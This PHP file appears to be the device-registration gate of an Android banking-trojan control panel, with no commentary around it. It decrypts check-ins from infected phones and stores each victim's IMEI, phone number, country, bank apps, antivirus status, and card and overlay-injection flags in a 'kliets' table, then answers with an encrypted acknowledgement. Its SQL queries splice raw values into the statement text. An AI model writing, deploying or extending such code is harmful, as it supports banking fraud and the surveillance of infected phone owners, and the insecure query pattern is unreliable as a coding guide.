<?php
$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include 'crypt.php';
include 'config.php';
$request = decrypt($request,cryptKey);

$request=str_replace(":)",")",$request);


if((!preg_match("/script/",$request)) && (!preg_match("/base64/",$request)) ) {

$massivReq = explode(":", $request);
$IMEI = isset($massivReq[0]) ? $massivReq[0] : "";
$phoneNumber =isset($massivReq[1]) ? $massivReq[1] : "";
$Version = isset($massivReq[2]) ? $massivReq[2] : "";
$country =isset($massivReq[3]) ? $massivReq[3] : "";
$bank = isset($massivReq[4]) ? $massivReq[4] : "";
$model = isset($massivReq[5]) ? $massivReq[5] : "";
$Version_apk = isset($massivReq[6]) ? $massivReq[6] : "";
$AV = isset($massivReq[7]) ? $massivReq[7] : "";
$iconCard = isset($massivReq[8]) ? $massivReq[8] : "";
$iconInj = isset($massivReq[9]) ? $massivReq[9] : "";

if(($IMEI!="")&&($phoneNumber!="")&&($Version!=""))
{
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$statement = $connection->prepare("SELECT IMEI FROM kliets WHERE IMEI='$IMEI'");
	$statement->execute([$IMEI]);

	$booleanIMEI = false;
	foreach($statement as $row)
	{
		if($row['IMEI']==$IMEI)
		{
			$booleanIMEI=true;
			break;
		}
	}
	if($booleanIMEI == false)
	{
		if($country=="")$country="not";

		$data = date('Y-m-d H:i:s');

		$statement = $connection->prepare("insert into kliets (IMEI,number,version,country,bank,model,lastConnect,firstConnect,version_apk,l_bank,inj)
		value ('$IMEI','$phoneNumber','$Version','$country','$bank','$model','$data','$data','$Version_apk','$iconCard','$iconInj')");
		$statement->execute(array($IMEI,$phoneNumber,$Version,$country,$bank,$model,$data,$data,$Version_apk,$iconCard,$iconInj));

		$tag = "<tag>";
		$otv = encrypt("|OK|",cryptKey);
		$tagend = "</tag>";

		echo "$tag$otv$tagend";
	}
	else
	{
		$tag = "<tag>";
		$otv = encrypt("|NO|",cryptKey);
		$tagend = "</tag>";

		echo "$tag$otv$tagend";
		//echo "<tag>|NO|</tag>";
	}
}
}
?>
